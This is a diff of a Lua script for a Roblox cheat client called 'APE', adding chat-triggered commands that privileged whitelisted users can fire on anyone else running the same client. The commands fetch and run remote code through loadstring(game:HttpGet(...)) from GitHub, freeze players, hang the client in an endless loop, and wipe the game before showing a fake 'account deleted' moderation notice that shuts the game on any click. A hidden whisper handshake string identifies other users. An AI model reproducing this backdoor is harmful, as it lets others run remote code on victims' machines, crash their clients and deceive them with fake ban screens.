+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))() 
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";chipman owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";xylex default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
+			else
+				print("No default player found!")
+			end
+		end,
+		[";xylex private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
+			else
+				print("No private player found!")
+			end
+		end,
+		[";xylex privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";xylex coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";xylex owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";josiah default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
+			else
+				print("No default player found!")
+			end
+		end,
+		[";josiah private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
+			else
+				print("No private player found!")
+			end
+		end,
+		[";josiah privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";josiah coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";josiah owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";freeze default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				defaultPlayer.Character.HumanoidRootPart.Massless = true
+			else
+				print("No default player found!")
+			end
+		end,
+		[";freeze private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				privatePlayer.Character.HumanoidRootPart.Massless = true
+			else
+				print("No private player found!")
+			end
+		end,
+		[";freeze privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				privateplusPlayer.Character.HumanoidRootPart.Massless = true
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";freeze coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				coownerPlayer.Character.HumanoidRootPart.Massless = true
+			else
+				print("No private player found!")
+			end
+		end,
+		[";freeze owner"] = function()
+			local ownerPlayer = getPlayerByType(5)
+			if ownerPlayer then
+				ownerPlayer.Character.HumanoidRootPart.Massless = true
+			else
+				print("No private player found!")
+			end
+		end,
+	
+		[";unfreeze default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				defaultPlayer.Character.HumanoidRootPart.Massless = false
+			else
+				print("No default player found!")
+			end
+		end,
+		[";unfreeze private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				privatePlayer.Character.HumanoidRootPart.Massless = false
+			else
+				print("No private player found!")
+			end
+		end,
+		[";unfreeze privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				privateplusPlayer.Character.HumanoidRootPart.Massless = false
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";unfreeze coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				coownerPlayer.Character.HumanoidRootPart.Massless = false
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";unfreeze owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				ownerPlayer.Character.HumanoidRootPart.Massless = false
+			else
+				print("No owner player found!")
+			end
+		end,
+	
+		[";crash default"] = function() 
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
+				while true do end
+			else
+				print("No default player found!")
+			end
+		end,
+		[";crash private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+				while true do end
+			else
+				print("No private player found!")
+			end
+		end,
+		[";crash privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+				while true do end
+			else
+				print("No private+ player found!")
+			end
+		end,
+		[";crash coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+				while true do end
+			else
+				print("No coowner player found!")
+			end
+		end,
+		[";crash owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+				while true do end
+			else
+				print("No owner player found!")
+			end
+		end,
+		
+		[";byfron default"] = function()
+			local defaultPlayer = getPlayerByType(0)
+			if defaultPlayer then
 		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
 					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
@@ -12091,379 +12864,503 @@ local commands = {
 								}, {e})}))
 						Roact.mount(screengui, game:GetService("CoreGui"))
 					end)
-				end
-			end,
-	[";chipman default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
-		end
-	end,
-	[";josiah default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
-		end
-	end,
-	[";xylex default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
-		end
-	end,
-	[";framerate default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    setfpscap(1)
-		end
-	end,
-	[";jump default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
-				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+				else
+				print("No default player found!")
 			end
-		end
-	end,
-	[";sit default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if entityLibrary.isAlive then
-				entityLibrary.character.Humanoid.Sit = true
-			end
-		end
-	end,
-	[";trip default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if entityLibrary.isAlive then
-			    entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-			end
-		end
-	end,
-	[";unsit default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if entityLibrary.isAlive then
-				entityLibrary.character.Humanoid.Sit = false
-			end
-		end
-	end,
-	[";monkey default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    local str = ""
-				for i,v in pairs(args) do
-					str = str..v..(i > 1 and " " or "")
-				end
-				if str == "" then str = "skill issue" end
-				local video = Instance.new("VideoFrame")
-				video.Video = downloadVapeAsset("vape/assets/skill.webm")
-				video.Size = UDim2.new(1, 0, 1, 36)
-				video.Visible = false
-				video.Position = UDim2.new(0, 0, 0, -36)
-				video.ZIndex = 9
-				video.BackgroundTransparency = 1
-				video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-				local textlab = Instance.new("TextLabel")
-				textlab.TextSize = 45
-				textlab.ZIndex = 10
-				textlab.Size = UDim2.new(1, 0, 1, 36)
-				textlab.TextColor3 = Color3.new(1, 1, 1)
-				textlab.Text = str
-				textlab.Position = UDim2.new(0, 0, 0, -36)
-				textlab.Font = Enum.Font.Gotham
-				textlab.BackgroundTransparency = 1
-				textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-				video.Loaded:Connect(function()
-					video.Visible = true
-					video:Play()
-					task.spawn(function()
-						repeat
-							wait()
-							for i = 0, 1, 0.01 do
-								wait(0.01)
-								textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-							end
-						until true == false
+		end,
+		[";byfron private"] = function()
+			local privatePlayer = getPlayerByType(1)
+			if privatePlayer then
+		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+					lplr.PlayerGui:ClearAllChildren()
+					GuiLibrary.MainGui.Enabled = false
+					game:GetService("CoreGui"):ClearAllChildren()
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					task.wait(0.2)
+					lplr:Kick()
+					game:GetService("GuiService"):ClearError()
+					task.wait(2)
+					local gui = Instance.new("ScreenGui")
+					gui.IgnoreGuiInset = true
+					gui.Parent = game:GetService("CoreGui")
+					local frame = Instance.new("Frame")
+					frame.BorderSizePixel = 0
+					frame.Size = UDim2.new(1, 0, 1, 0)
+					frame.BackgroundColor3 = Color3.new(1, 1, 1)
+					frame.Parent = gui
+					task.delay(0.1, function()
+						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 					end)
-				end)
-				task.wait(19)
-				task.spawn(function()
-					pcall(function()
-						if getconnections then
-							getconnections(entityLibrary.character.Humanoid.Died)
-						end
-						print(game:GetObjects("h29g3535")[1])
+					task.delay(2, function()
+						local e = Roact.createElement(auth, {
+							style = {},
+							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+							moderationDetails = {
+								punishmentTypeDescription = "Delete",
+								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+								reactivateAccountActivated = true,
+								badUtterances = {},
+								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+							},
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
+							globalGuiInset = {
+								top = 0
+							}
+						})
+						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+								localization = tLocalization.mock()
+							}, {Roact.createElement(UIBlox.Style.Provider, {
+									style = {
+										Theme = darktheme,
+										Font = gotham
+									},
+								}, {e})}))
+						Roact.mount(screengui, game:GetService("CoreGui"))
 					end)
-					while true do end
-				end)
+				else
+				print("No private player found!")
 			end
 		end,
-	[";enable default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if #args >= 1 then
-					local module
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-							module = v
-							break
-						end
-					end
-					if module and not module.Api.Enabled then
-						module.Api.ToggleButton()
-					end
-				end
+		[";byfron privateplus"] = function()
+			local privateplusPlayer = getPlayerByType(2)
+			if privateplusPlayer then
+		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+					lplr.PlayerGui:ClearAllChildren()
+					GuiLibrary.MainGui.Enabled = false
+					game:GetService("CoreGui"):ClearAllChildren()
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					task.wait(0.2)
+					lplr:Kick()
+					game:GetService("GuiService"):ClearError()
+					task.wait(2)
+					local gui = Instance.new("ScreenGui")
+					gui.IgnoreGuiInset = true
+					gui.Parent = game:GetService("CoreGui")
+					local frame = Instance.new("Frame")
+					frame.BorderSizePixel = 0
+					frame.Size = UDim2.new(1, 0, 1, 0)
+					frame.BackgroundColor3 = Color3.new(1, 1, 1)
+					frame.Parent = gui
+					task.delay(0.1, function()
+						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+					end)
+					task.delay(2, function()
+						local e = Roact.createElement(auth, {
+							style = {},
+							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+							moderationDetails = {
+								punishmentTypeDescription = "Delete",
+								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+								reactivateAccountActivated = true,
+								badUtterances = {},
+								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+							},
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
+							globalGuiInset = {
+								top = 0
+							}
+						})
+						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+								localization = tLocalization.mock()
+							}, {Roact.createElement(UIBlox.Style.Provider, {
+									style = {
+										Theme = darktheme,
+										Font = gotham
+									},
+								}, {e})}))
+						Roact.mount(screengui, game:GetService("CoreGui"))
+					end)
+				else
+				print("No private+ player found!")
 			end
 		end,
-	[";disable default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if #args >= 1 then
-					local module
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-							module = v
-							break
-						end
-					end
-					if module and module.Api.Enabled then
-						module.Api.ToggleButton()
-					end
-				end
+		[";byfron coowner"] = function()
+			local coownerPlayer = getPlayerByType(3)
+			if coownerPlayer then
+		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+					lplr.PlayerGui:ClearAllChildren()
+					GuiLibrary.MainGui.Enabled = false
+					game:GetService("CoreGui"):ClearAllChildren()
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					task.wait(0.2)
+					lplr:Kick()
+					game:GetService("GuiService"):ClearError()
+					task.wait(2)
+					local gui = Instance.new("ScreenGui")
+					gui.IgnoreGuiInset = true
+					gui.Parent = game:GetService("CoreGui")
+					local frame = Instance.new("Frame")
+					frame.BorderSizePixel = 0
+					frame.Size = UDim2.new(1, 0, 1, 0)
+					frame.BackgroundColor3 = Color3.new(1, 1, 1)
+					frame.Parent = gui
+					task.delay(0.1, function()
+						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+					end)
+					task.delay(2, function()
+						local e = Roact.createElement(auth, {
+							style = {},
+							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+							moderationDetails = {
+								punishmentTypeDescription = "Delete",
+								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+								reactivateAccountActivated = true,
+								badUtterances = {},
+								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+							},
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
+							globalGuiInset = {
+								top = 0
+							}
+						})
+						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+								localization = tLocalization.mock()
+							}, {Roact.createElement(UIBlox.Style.Provider, {
+									style = {
+										Theme = darktheme,
+										Font = gotham
+									},
+								}, {e})}))
+						Roact.mount(screengui, game:GetService("CoreGui"))
+					end)
+				else
+				print("No coowner player found!")
 			end
 		end,
-	[";toggle default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if #args >= 1 then
-					local module
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-							module = v
-							break
-						end
-					end
-					if module then
-						module.Api.ToggleButton()
-					end
-				end
+		[";byfron owner"] = function()
+			local ownerPlayer = getPlayerByType(4)
+			if ownerPlayer then
+		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+					lplr.PlayerGui:ClearAllChildren()
+					GuiLibrary.MainGui.Enabled = false
+					game:GetService("CoreGui"):ClearAllChildren()
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					task.wait(0.2)
+					lplr:Kick()
+					game:GetService("GuiService"):ClearError()
+					task.wait(2)
+					local gui = Instance.new("ScreenGui")
+					gui.IgnoreGuiInset = true
+					gui.Parent = game:GetService("CoreGui")
+					local frame = Instance.new("Frame")
+					frame.BorderSizePixel = 0
+					frame.Size = UDim2.new(1, 0, 1, 0)
+					frame.BackgroundColor3 = Color3.new(1, 1, 1)
+					frame.Parent = gui
+					task.delay(0.1, function()
+						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+					end)
+					task.delay(2, function()
+						local e = Roact.createElement(auth, {
+							style = {},
+							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+							moderationDetails = {
+								punishmentTypeDescription = "Delete",
+								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+								reactivateAccountActivated = true,
+								badUtterances = {},
+								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+							},
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
+							globalGuiInset = {
+								top = 0
+							}
+						})
+						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+								localization = tLocalization.mock()
+							}, {Roact.createElement(UIBlox.Style.Provider, {
+									style = {
+										Theme = darktheme,
+										Font = gotham
+									},
+								}, {e})}))
+						Roact.mount(screengui, game:GetService("CoreGui"))
+					end)
+				else
+				print("No owner player found!")
 			end
 		end,
-	[";steal default"] = function(args, plr)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
-					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+	}
+	function isPlayerAllowed()
+		return false
+	end
+	
+	local txt = game:GetService("TextChatService")
+	local private = {}
+	local privateplus = {}
+	local coowner = {}
+	local owner = {}
+	local users = {}
+	
+	task.spawn(function()
+		repeat task.wait()
+			for i,plr in pairs(game.Players:GetPlayers()) do 
+				if table.find(private,plr) then return end
+				if not CanAttackUser(plr) then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
+					newchannel:SendAsync("KVQ67URD12")
+					table.insert(private,privateplus,coowner,owner,plr)
 					task.wait(1)
+					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
 				end
-				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
-					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
-						item = v.tool,
-						amount = v.amount ~= math.huge and v.amount or 99999999
+			end
+		until false
+	end)
+	
+	local users = {}
+	
+	txt.OnIncomingMessage = function(msg)
+		local p = Instance.new("TextChatMessageProperties")
+		local message = msg
+		if msg.TextSource then
+			local plr2
+			local userId = tostring(msg.TextSource.UserId)
+			for i,v in pairs(game.Players:GetPlayers()) do
+				if tostring(v.UserId) == userId then
+					plr2 = v
+					break
+				end
+			end
+			local otherPriority, plrattackable, plrtag = WhitelistFunctionsAreFunny:GetWhitelist(plr2)
+			if CanAttackUser(plr2) and plr2 ~= lplr then
+				if message.Text:find("KVQ67URD12") then
+					warningNotification("Vape",plr2.Name.."is using APE!",60)
+					table.insert(users,plr2.UserId)
+				end
+			end
+			if message.Text:find("KVQ67URD12") or message.Text:lower():find("privately") then
+				p.PrefixText = ""
+				return p
+			end
+			for i,v in pairs(commands) do
+				if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
+					local plr
+					for i,v in pairs(game.Players:GetPlayers()) do
+						if tostring(v.UserId) == userId then
+							plr = v
+							break
+						end
+					end
+					if plr == nil then break end
+					if not CanAttackUser(plr) then
+						v()
+					end
+					break
+				end
+			end
+			local colors = {
+				["red"] = "#ff0000",
+				["orange"] = "#ff7800",
+				["yellow"] = "#e5ff00",
+				["green"] = "#00ff00",
+				["blue"] = "#0000ff",
+				["purple"] = "#b800b8",
+				["pink"] = "#ff00ff",
+				["black"] = "#000000",
+				["white"] = "#ffffff",
+				["cyan"] =  "#00ffff",
+			}
+			if CanAttackUser(plr2) and plr2 ~= lplr then
+				if message.Text:find("KVQ67URD12") then
+					warningNotification("Vape",plr2.Name.." is a salad client user!",60)
+					table.insert(users,plr2.UserId)
+					table.insert(whitelist["tags"],{
+						userid = plr2.UserId,
+						color = "yellow",
+						tag = "APE USER"
 					})
-					if e then 
-						e.CFrame = plr.Character.HumanoidRootPart.CFrame
-					else
-						v.tool:Destroy()
+				end
+			end
+			if message.Text:lower():find("KVQ67URD12") or message.Text:lower():find("you are now privately chatting") then 
+				p.PrefixText = ""
+				msg.Text = ""
+				return p
+			end
+			for i,v in pairs(commands) do
+				if tostring(i) == tostring(message.Text) then
+					local plr
+					for i,v in pairs(game.Players:GetPlayers()) do
+						if tostring(v.UserId) == userId then
+							plr = v
+							break
+						end
+					end
+					if plr == nil or plr == lplr then break end
+					if not CanAttackUser(plr) then
+						v()
+					end
+					break
+				end
+			end
+			p.PrefixText = msg.PrefixText
+			print(message.Text,":",userId)
+	
+			local userType = 0
+			local hasTag = false
+			if users[plr2.UserId] ~= nil then
+				p.PrefixText = "<font color='"..colors["yellow"].."'>[APE USER]</font> " .. msg.PrefixText
+				hasTag = true
+				return p
+			end
+	
+			if whitelist["tags"] ~= nil then
+				for i, v in pairs(whitelist["tags"]) do
+					if v.userid == userId then
+						hasTag = true
+						local color = colors[v.color] or colors["yellow"]
+						p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
 					end
 				end
 			end
-		end,
-	[";uninject default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    GuiLibrary.SelfDestruct()
+	
+			if whitelist["Private"] ~= nil then
+				for i, v in pairs(whitelist["Private"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='"..colors["purple"].."'>[APE PRIVATE]</font> " .. msg.PrefixText
+						end
+						userType = 1
+					end
+				end
+			end
+	
+			if whitelist["PrivatePlus"] ~= nil then
+				for i, v in pairs(whitelist["PrivatePlus"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='"..colors["purple"].."'>[APE PRIVATE+]</font> " .. msg.PrefixText
+						end
+						userType = 2
+					end
+				end
+			end
+	
+			if whitelist["CoOwner"] ~= nil then
+				for i, v in pairs(whitelist["Owner"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='"..colors["black"].."'>[CO-APE OWNER]</font> " .. msg.PrefixText
+						end
+						userType = 3
+					end
+				end
+			end
+			
+			if whitelist["Owner"] ~= nil then
+				for i, v in pairs(whitelist["Owner"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='#ff0000'>[APE OWNER]</font> " .. msg.PrefixText
+						end
+						userType = 4
+					end
+				end
+			end
+			
+			if whitelist["RayHafz"] ~= nil then
+				for i, v in pairs(whitelist["RayHafz"]) do
+					if v.id == userId then
+						if not hasTag then
+							hasTag = true
+							p.PrefixText = "<font color='"..colors["pink"].."'>[RayHafz Femboy💜]</font> " .. msg.PrefixText
+						end
+						userType = 5
+					end
+				end
+			end
 		end
-	end,
-	[";gravity default"] = function(args)
-	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    workspace.Gravity = tonumber(args[1]) or 192.6
-		end
+	
+		return p
 	end
-}
-
-function isPlayerAllowed()
-	return false
-end
-
-local txt = game:GetService("TextChatService")
-local coowner = {}
-local privateplus = {}
-local private = {}
-local users = {}
-
-task.spawn(function()
-	repeat task.wait()
-		for i,plr in pairs(game.Players:GetPlayers()) do 
-			if table.find(private,plr) then return end
-			if not CanAttackUser(plr) then
-				local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-				local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
-				newchannel:SendAsync("alabamababy")
-				table.insert(coowner,privateplus,private,plr)
-				task.wait(1)
-				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-			end
-		end
-	until false
-end)
-
-local users = {}
-
-txt.OnIncomingMessage = function(msg)
-	local p = Instance.new("TextChatMessageProperties")
-	local message = msg
-	if msg.TextSource then
-		local plr2
-		local userId = tostring(msg.TextSource.UserId)
-		for i,v in pairs(game.Players:GetPlayers()) do
-			if tostring(v.UserId) == userId then
-				plr2 = v
-				break
-			end
-		end
-		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
-		if CanAttackUser(plr2) and plr2 ~= lplr then
-			if message.Text:find("alabamababy") then
-				warningNotification("Vape",plr2.Name.." is using APE!",60)
-				table.insert(users,plr2.UserId)
-			end
-		end
-		if message.Text:find("doometernal") or message.Text:lower():find("privately") then
-			p.PrefixText = ""
-			return p
-		end
